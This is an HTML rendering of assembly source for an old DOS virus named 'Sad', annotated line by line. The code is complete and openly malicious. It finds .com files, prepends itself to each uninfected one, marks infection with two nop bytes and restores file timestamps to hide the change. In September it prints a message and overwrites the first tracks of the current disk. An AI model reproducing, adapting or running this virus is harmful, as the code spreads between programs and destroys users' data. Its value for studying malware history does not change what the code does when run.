<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>SAD.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ---- Data Segment Values ----</span><span class="sc0">
</span><span class="sc1">; ds:[0f6h] = read buffer location</span><span class="sc0">
</span><span class="sc1">; ds:[0f8h] = write buffer location</span><span class="sc0">
</span><span class="sc1">; ds:[0fah] = store length of virus at this location</span><span class="sc0">
</span><span class="sc1">; ds:[0fch] = store length of file to be infected at this location</span><span class="sc0">
</span><span class="sc1">; ds:[0feh] = filename of file to infect</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
 
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">; origin for .com files</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
 
   </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; these two nop instructs will be used by 'Nasty'</span><span class="sc0">
   </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; to determine if a file is already infected</span><span class="sc0">
 
   </span><span class="sc1">;******</span><span class="sc0">
   </span><span class="sc1">;get date</span><span class="sc0">
   </span><span class="sc1">;******</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">              </span><span class="sc1">; get the date</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">              </span><span class="sc1">; is it September?</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">do_not_activate</span><span class="sc0">     </span><span class="sc1">; if NO jmp do_not_activate</span><span class="sc0">
   </span><span class="sc1">;****</span><span class="sc0">
   </span><span class="sc1">;the nasty bit</span><span class="sc0">
   </span><span class="sc1">;****</span><span class="sc0">
   </span><span class="sc1">;*</span><span class="sc0">
   </span><span class="sc1">;* 1. Print message</span><span class="sc0">
   </span><span class="sc1">;*</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">mess</span><span class="sc0">             </span><span class="sc1">; print message</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc0">               </span><span class="sc1">; 'Nasty in September'</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
   </span><span class="sc1">;****</span><span class="sc0">
   </span><span class="sc1">;* 2. Destroy disk</span><span class="sc0">
   </span><span class="sc1">;****</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">              </span><span class="sc1">; get current drive (returned in al)</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; dl = drive # to be formated</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">               </span><span class="sc1">; disk format function</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">               </span><span class="sc1">; first sector</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">; first track</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">; head zero</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">; 10h (16) sectors - 2 tracks</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; do it (overwrite first 16 tracks on currently</span><span class="sc0">
                           </span><span class="sc1">;   selected disc)</span><span class="sc0">
 
 
</span><span class="sc5">do_not_activate</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">              </span><span class="sc1">; save parameters; set counter to 80h bytes</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">            </span><span class="sc1">; offset in the current data segment of the byte</span><span class="sc0">
                           </span><span class="sc1">;   to be copied</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ff7fh</span><span class="sc0">           </span><span class="sc1">; offset to which byte is to be moved</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; move bytes until cx=0 (decrement cx by 1 each time</span><span class="sc0">
                           </span><span class="sc1">;   loop is performed is done automatically)</span><span class="sc0">
                           </span><span class="sc1">;   (increment by 1 of si &amp; di is done automatically)</span><span class="sc0">
 
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">begp</span><span class="sc0">             </span><span class="sc1">; load exit from program offset address into ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;  "    "    "     "       "      "      "   cx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">; subtract start of .com file address (100h) from ax</span><span class="sc0">
                           </span><span class="sc1">;   ax now contains the length of the virus</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; put length of the virus into the data segment at</span><span class="sc0">
                           </span><span class="sc1">;   offset 0fah</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fso</span><span class="sc0">              </span><span class="sc1">; add fso (5h) to cx (offset address of exit)</span><span class="sc0">
                           </span><span class="sc1">;   so, cx=cx+5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0f8h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; move cx (end of virus + 5) into data segment at</span><span class="sc0">
                           </span><span class="sc1">;   offset 0f8h. ** Start of the write buffer.</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; add virus length (ax) to cx ?????</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0f6h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; mov cx into data segment at offset 0f6h.</span><span class="sc0">
                           </span><span class="sc1">;   ** Start of the read buffer</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; mov length of virus into cx</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc0">            </span><span class="sc1">; load address of 'start' (start of virus) into</span><span class="sc0">
                           </span><span class="sc1">;   souce index</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0f8h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; mov the value of the write buffer (@ 0f8h) into</span><span class="sc0">
                           </span><span class="sc1">;   destination index</span><span class="sc0">
 
 
</span><span class="sc5">rb</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; cx = counter (length of virus)</span><span class="sc0">
                           </span><span class="sc1">; si = offset of byte to be read</span><span class="sc0">
                           </span><span class="sc1">; di = offset of where to write byte to</span><span class="sc0">
                           </span><span class="sc1">; (auto decrement of cx &amp; increment of si &amp; di)</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy the virus into memory</span><span class="sc0">
 
   </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">; set the carry flag</span><span class="sc0">
 
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_type_to_infect</span><span class="sc0">     </span><span class="sc1">; set infector for .com files only</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                     </span><span class="sc1">; find first file with specified params</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                     </span><span class="sc1">; files with archive bit set</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">; do it</span><span class="sc0">
                                  </span><span class="sc1">; if file found, CF is cleared, else</span><span class="sc0">
                                  </span><span class="sc1">;   CF is set</span><span class="sc0">
 
   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; works the below instructions (jz &amp; jmp)</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">file_found</span><span class="sc0">           </span><span class="sc1">; if file found jmp file_found</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0">                </span><span class="sc1">; if no file found, jmp done (exit virus)</span><span class="sc0">
 
</span><span class="sc5">file_found</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">              </span><span class="sc1">; get dta (returned in es:bx)</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; mov size of file to be infected into ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; mov filesize into ds:[0fch]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">              </span><span class="sc1">; bx now points to asciz filename</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0feh</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; mov filename into ds:[0feh]</span><span class="sc0">
   </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">; clear carry flag</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">            </span><span class="sc1">; open file for r/w (ds:dx -&gt; asciz filename)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; mov filename into dx</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it (ax contains file handle)</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; mov file handle into bx</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">            </span><span class="sc1">; get time &amp; date attribs from file to infect</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it (file handle in bx)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                 </span><span class="sc1">; save time to the stack</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; save date to the stack</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">              </span><span class="sc1">; read from file to be infected</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; number of bytes to be read (filesize of file to</span><span class="sc0">
                           </span><span class="sc1">;   be infected</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0f6h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; buffer (where to read bytes to)</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; mov buffer location to bx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; mov contents of bx (first two bytes - as bx is</span><span class="sc0">
                           </span><span class="sc1">;   16-bits) into ax.</span><span class="sc0">
 
                           </span><span class="sc1">; Now check to see if file is infected... if the</span><span class="sc0">
                           </span><span class="sc1">;    file is infected, it's first two bytes will be</span><span class="sc0">
                           </span><span class="sc1">;    9090h (nop nop)</span><span class="sc0">
 
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">9090h</span><span class="sc0">            </span><span class="sc1">; If file is already infected, zero flag will be set</span><span class="sc0">
                           </span><span class="sc1">;   thus jump to fin(ish)</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">
 
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; mov filesize of file to be infected into ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0f6h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; mov where-to-read-to buffer into bx</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; correct old len</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">              </span><span class="sc1">; Create file with handle</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">              </span><span class="sc1">; cx=attribs -- set no attributes</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0feh</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; point to name</span><span class="sc0">
   </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">; clear carry flag</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; create file</span><span class="sc0">
                           </span><span class="sc1">; Note: If filename already exists, (which it does)</span><span class="sc0">
                           </span><span class="sc1">;   truncate the filelength to zero - this is ok as</span><span class="sc0">
                           </span><span class="sc1">;   we have already copied the file to be infected</span><span class="sc0">
                           </span><span class="sc1">;   into memory.</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; mov file handle into bx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; write file with handle (write to the file to be</span><span class="sc0">
                           </span><span class="sc1">;   infected) - length currently zero</span><span class="sc0">
                           </span><span class="sc1">;   cx=number of bytes to write</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; length of file to be infected</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fah</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; length of virus</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0f8h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; location of write buffer (this contains the virus</span><span class="sc0">
                           </span><span class="sc1">;   + the file to be infected)</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; write file</span><span class="sc0">
                           </span><span class="sc1">; new file = virus + file to be infected</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">            </span><span class="sc1">; restore original time &amp; date values</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; get old date from the stack</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; get old time from the stack</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
                           </span><span class="sc1">; Note: Infected file will now carry the time &amp; date</span><span class="sc0">
                           </span><span class="sc1">;   it had before the infection.</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">              </span><span class="sc1">; close file (bx=file handle)</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
                           </span><span class="sc1">; Note: date &amp; time stamps automatically updated if</span><span class="sc0">
                           </span><span class="sc1">;   file written to.</span><span class="sc0">
 
</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">; set carry flags</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">              </span><span class="sc1">; find next file (.com)</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; do it</span><span class="sc0">
   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; decides zero flag outcome</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0">                </span><span class="sc1">; if no more .com files, jmp done</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">file_found</span><span class="sc0">          </span><span class="sc1">;   else begin re-infection process for new file.</span><span class="sc0">
 
</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">              </span><span class="sc1">; set counter (cx) = 80h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0ff7fh</span><span class="sc0">           </span><span class="sc1">; source offset address (copy from here)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">            </span><span class="sc1">; destination offset address (copy to here)</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy bytes! (cx is auto decremented by 1</span><span class="sc0">
                           </span><span class="sc1">;   si &amp; di are auto incremented by 1)</span><span class="sc0">
                           </span><span class="sc1">; Note: this is a 'restore parameters' feature</span><span class="sc0">
                           </span><span class="sc1">;   this does the reverse of what what done earlier</span><span class="sc0">
                           </span><span class="sc1">;   in the program (do_not_activate:)</span><span class="sc0">
 
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a4f3h</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fff9h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fffbh</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; reset data segment locations ??? (to previous</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">;   values before virus infection)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fffch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">begp</span><span class="sc0">             </span><span class="sc1">; load exit from program offset address into si</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc0">            </span><span class="sc1">; load offset address of start of virus into di</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fffeh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; re-align cs = ds ???</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">kk</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fso</span><span class="sc0">
 
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                 </span><span class="sc1">; define byte</span><span class="sc0">
   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0fff9h</span><span class="sc0">               </span><span class="sc1">; define word</span><span class="sc0">
   </span><span class="sc5">kk</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">             </span><span class="sc1">; define kk = word</span><span class="sc0">
 
   </span><span class="sc5">mess</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sad virus - 24/8/91'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">    </span><span class="sc1">; virus message to display</span><span class="sc0">
 
   </span><span class="sc5">file_type_to_infect</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*?.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; infect only .com files.</span><span class="sc0">
 
   </span><span class="sc5">fso</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0005h</span><span class="sc0">            </span><span class="sc1">; store 5 into 'fso'. dw means that fso is 2 bytes</span><span class="sc0">
                           </span><span class="sc1">;   in size (a word)</span><span class="sc0">
                           </span><span class="sc1">; ----- alma mater</span><span class="sc0">
 
 
</span><span class="sc5">begp</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">        </span><span class="sc1">; normal dos termination (set al to 00)</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; do it</span><span class="sc0">
 
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
 </span></div></body>
</html>
